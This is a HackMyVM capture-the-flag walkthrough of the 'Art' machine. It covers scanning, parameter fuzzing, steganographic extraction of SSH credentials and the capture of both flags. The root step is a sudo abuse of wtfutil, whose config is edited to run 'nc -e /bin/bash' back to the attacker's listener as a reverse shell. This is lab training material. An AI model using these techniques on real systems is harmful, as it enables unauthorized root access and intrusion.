# CTF Penetration Testing

## HackMyVM

### Art - Machine

#### Machine Description

- Machine name: [Art](https://hackmyvm.eu/machines/machine.php?vm=Art)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟩 Easy

<img src="https://hackmyvm.eu/img/vm/ez.png" alt="Art Machine Logo" width="150"/>

#### Tools Used

- curl
- ffuf
- Gobuster
- Netcat
- Nmap
- pwncat-cs
- Stegseek

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.139 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.139`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 11:45 CEST
Nmap scan report for 192.168.56.139
Host is up (0.021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) ←
80/tcp open  http    nginx 1.18.0 ←
MAC Address: 08:00:27:FD:BA:2F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.30 seconds
```

`whatweb -a 3 -v http://192.168.56.139`:
```
WhatWeb report for http://192.168.56.139
Status    : 200 OK
Title     : <None>
IP        : 192.168.56.139
Country   : RESERVED, ZZ

Summary   : HTTPServer[nginx/1.18.0], nginx[1.18.0]

Detected Plugins:
[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        String       : nginx/1.18.0 (from server string)

[ nginx ]
        Nginx (Engine-X) is a free, open-source, high-performance 
        HTTP server and reverse proxy, as well as an IMAP/POP3 
        proxy server. 

        Version      : 1.18.0
        Website     : http://nginx.net/

HTTP Headers:
        HTTP/1.1 200 OK
        Server: nginx/1.18.0
        Date: Fri, 11 Oct 2024 09:48:08 GMT
        Content-Type: text/html; charset=UTF-8
        Transfer-Encoding: chunked
        Connection: close
        Content-Encoding: gzip
```

`curl -s http://192.168.56.139`:
```                          
SEE HMV GALLERY!
<br>
 <img src=abc321.jpg><br><img src=jlk19990.jpg><br><img src=ertye.jpg><br><img src=zzxxccvv3.jpg><br>
<!-- Need to solve tag parameter problem. --> ←
```

`gobuster dir -u http://192.168.56.139 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,jpg,txt,zip -t 15`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.139
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404,500,400,401
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,zip,html,php,bak,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 170] ←

[...]
```

`curl -v "http://192.168.56.139/index.php?tag=TEST"`:
```
*   Trying 192.168.56.139:80...
* Connected to 192.168.56.139 (192.168.56.139) port 80
> GET /index.php?tag=TEST HTTP/1.1
> Host: 192.168.56.139
> User-Agent: curl/8.8.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK ←
< Server: nginx/1.18.0
< Date: Fri, 11 Oct 2024 10:05:15 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< 
SEE HMV GALLERY!
<br>
 
<!-- Need to solve tag parameter problem. -->
* Connection #0 to host 192.168.56.139 left intact
```

`curl -s "http://192.168.56.139/index.php?tag=TEST" | wc -c`:
```
70 ←
```

`gobuster dir -u "http://192.168.56.139/index.php?tag=" -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,list,tmp,old,jpg,txt,zip -t 15 --add-slash --exclude-length 70`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.139/index.php?tag=
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   400,401,404,500
[+] Exclude Length:          70
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,list,tmp,old,jpg,php,bak,txt,zip
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

[...]
```

`ffuf -u "http://192.168.56.139/index.php?tag=ENGLISH" -w /usr/share/wordlists/seclists/SecLists-master/Miscellaneous/lang-english.txt:ENGLISH -c -ic -t 15 -fs 70`:
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.139/index.php?tag=ENGLISH
 :: Wordlist         : ENGLISH: /usr/share/wordlists/seclists/SecLists-master/Miscellaneous/lang-english.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 15
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 70
________________________________________________

beauty                  [Status: 200, Size: 93, Words: 12, Lines: 5, Duration: 18ms] ←
:: Progress: [354297/354297] :: Job [1/1] :: 757 req/sec :: Duration: [0:07:36] :: Errors: 0 ::
```

`curl -s "http://192.168.56.139/index.php?tag=beauty"`:
```     
SEE HMV GALLERY!
<br>
 <img src=dsa32.jpg><br> ←
<!-- Need to solve tag parameter problem. -->
```

`wget http://192.168.56.139/dsa32.jpg`:
```
--2024-10-11 12:35:08--  http://192.168.56.139/dsa32.jpg
Connecting to 192.168.56.139:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4164096 (4.0M) [image/jpeg]
Saving to: ‘dsa32.jpg’

dsa32.jpg                                       100%[====================================================================================================>]   3.97M  --.-KB/s    in 0.07s   

2024-10-11 12:35:08 (55.6 MB/s) - ‘dsa32.jpg’ saved [4164096/4164096] ←
```

`file ./dsa32.jpg`:
```
./dsa32.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 4000x6016, components 3
```

`binwalk ./dsa32.jpg`:
```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```

`stegseek ./dsa32.jpg`:
```
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "" ←
[i] Original filename: "yes.txt". ←
[i] Extracting to "dsa32.jpg.out".
```

`file ./yes.txt`:
```
./yes.txt: ASCII text ←
```

`cat ./yes.txt`:
```
lion/shel0vesyou ←
```

`ssh lion@192.168.56.139`:
```
lion@192.168.56.139's password: ←
Linux art 5.10.0-16-amd64 #1 SMP Debian 5.10.127-2 (2022-07-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Oct 11 12:41:55 2024 from 192.168.56.118
```

![Victim: lion](https://img.shields.io/badge/Victim-lion-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
lion ←
```

`id`:
```
uid=1000(lion) gid=1000(lion) grupos=1000(lion),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

`uname -a`:
```
Linux art 5.10.0-16-amd64 #1 SMP Debian 5.10.127-2 (2022-07-23) x86_64 GNU/Linux
```

`lsb_release -a`:
```
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 11 (bullseye)
Release:        11
Codename:       bullseye
```

`cd /home/lion`

`ls -alps ./`:
```
total 32
4 drwxr-xr-x 3 lion lion 4096 ago  3  2022 ./
4 drwxr-xr-x 3 root root 4096 ago  3  2022 ../
0 lrwxrwxrwx 1 lion lion    9 ago  3  2022 .bash_history -> /dev/null
4 -rw-r--r-- 1 lion lion  220 ago  3  2022 .bash_logout
4 -rw-r--r-- 1 lion lion 3526 ago  3  2022 .bashrc
4 drwxr-xr-x 3 lion lion 4096 ago  3  2022 .local/
4 -rw-r--r-- 1 lion lion  807 ago  3  2022 .profile
4 -rw------- 1 lion lion   24 ago  3  2022 user.txt ←
4 -rw------- 1 lion lion   49 ago  3  2022 .Xauthority
```

`cat ./user.txt`:
```
HMVygUmTyvRPWduINKYfmpO ←
```

`ls -alps /var/www/html`:
```
total 18512
   4 drwxr-xr-x 2 root root    4096 ago  3  2022 ./
   4 drwxr-xr-x 3 root root    4096 ago  3  2022 ../
1136 -rw-r--r-- 1 lion lion 1160336 ago  3  2022 001uytr.jpg
3100 -rw-r--r-- 1 lion lion 3171502 ago  3  2022 abc321.jpg
4068 -rw-r--r-- 1 lion lion 4164096 ago  3  2022 dsa32.jpg
4604 -rw-r--r-- 1 lion lion 4712929 ago  3  2022 ertye.jpg
   4 -rw-r--r-- 1 root root     649 ago  3  2022 index.php
2920 -rw-r--r-- 1 lion lion 2989800 ago  3  2022 jlk19990.jpg
2672 -rw-r--r-- 1 lion lion 2732227 ago  3  2022 zzxxccvv3.jpg
```

`ls -l /home`:
```
total 4
drwxr-xr-x 3 lion lion 4096 ago  3  2022 lion
```

`sudo -l`:
```
Matching Defaults entries for lion on art:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lion may run the following commands on art:
    (ALL : ALL) NOPASSWD: /bin/wtfutil ←
```

`file /bin/wtfutil`:
```
/bin/wtfutil: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=k6zuC-CTkpVqmVBGGDRv/HD4Xhe_b_0bMPG2qLWwS/6ozjpJ1jEtJtCQOuS2rs/_sdKVBhnVlLofuvS6e9G, stripped
```

`ls -l /bin/wtfutil`:
```
-rwxr-xr-x 1 501 staff 46600192 dic 28  2021 /bin/wtfutil ←
```

`/bin/wtfutil --help`:
```
Usage:
  wtfutil [OPTIONS] [command] [args...]

Application Options:
  -c, --config=  Path to config file
  -m, --module=  Display info about a specific module, i.e.: 'wtfutil -m=todo'
  -p, --profile  Profile application memory usage
  -v, --version  Show version info

Help Options:
  -h, --help     Show this help message


Commands:
  save-secret <service>
    service      Service URL or module name of secret.
  Save a secret into the secret store. The secret will be prompted for.
  Requires wtf.secretStore to be configured.  See individual modules for
  information on what service and secret means for their configuration,
  not all modules use secrets.
```

`/bin/wtfutil`:
```
[...]

┌ ~/.config/wtf/config.yml 1 ─┐ ←
│                             │
│wtf:                         │
│  colors:                    │
│    border:                  │
│      focusable: darkslateblu│
│      focused: orange        │
│      normal: gray           │
│  grid:                      │
│    columns: [32, 32, 32, 32,│
│    rows: [10, 10, 10, 4, 4, │
│  refreshInterval: 1         │
│  mods:                      │
│    clocks_a:                │
│      colors:                │
│        rows:                │
│          even: "lightblue"  │
│          odd: "white"       │
│      enabled: true          │
│      locations:             │
│        Vancouver: "America/V│
│        Toronto: "America/Tor│
│      position:              │
│        top: 0               │
│        left: 1              │
│        height: 1            │
│        width: 1             │
│      refreshInterval: 15    │
│      sort: "alphabetical"   │
│      title: "Clocks A"      │
│      type: "clocks"         │
│    clocks_b:                │
│      colors:                │
└─────────────────────────────┘

[...]
```

`cat ~/.config/wtf/config.yml`:
```
[...]

    uptime:
      args: [""] ←
      cmd: "uptime" ←
      enabled: true
      position:
        top: 3
        left: 1
        height: 1
        width: 2
      refreshInterval: 30
      type: cmdrunner
```

`which nc`:
```
/usr/bin/nc
```

`cp ~/.config/wtf/config.yml ./fake_config.yml`

`nano ./fake_config.yml`:
```
[...]

  uptime:
      args: ["-e", "/bin/bash", "192.168.56.118", "4444"] ←
      cmd: "nc" ←
      enabled: true
      position:
        top: 3
        left: 1
        height: 1
        width: 2
      refreshInterval: 30
      type: cmdrunner
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`pwncat-cs -lp 4444`:
```
[13:13:13] Welcome to pwncat 🐈!
bound to 0.0.0.0:4444 ←
```

![Victim: lion](https://img.shields.io/badge/Victim-lion-64b5f6?logo=linux&logoColor=white)

`sudo /bin/wtfutil --config=./fake_config.yml`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

```
[13:21:45] received connection from 192.168.56.139:45604 ←
[13:21:46] 192.168.56.139:45604: registered new host w/ db
```

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
root ←
```

`id`:
```
uid=0(root) gid=0(root) groups=0(root) ←
```

`cd /root`

`ls -alps`:
```
total 36
4 drwx------  5 root root 4096 oct 11 13:21 ./
4 drwxr-xr-x 18 root root 4096 ago  3  2022 ../
0 lrwxrwxrwx  1 root root    9 ago  3  2022 .bash_history -> /dev/null
4 -rw-r--r--  1 root root  571 abr 10  2021 .bashrc
4 drwxr-xr-x  3 root root 4096 oct 11 13:21 .config/
4 drwxr-xr-x  3 root root 4096 ago  3  2022 .local/
4 -rw-------  1 root root 1967 ago  3  2022 .mysql_history
4 -rw-r--r--  1 root root  161 jul  9  2019 .profile
4 drwx------  2 root root 4096 ago  3  2022 .ssh/
4 -rw-r--r--  1 root root  165 ago  3  2022 .wget-hsts
```

`find / -iname "root*" 2> /dev/null`:
```
[...]

/var/opt/root.txt ←

[...]
```

`cat /var/opt/root.txt`:
```
mZxbPCjEQYOqkNCuyIuTHMV ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
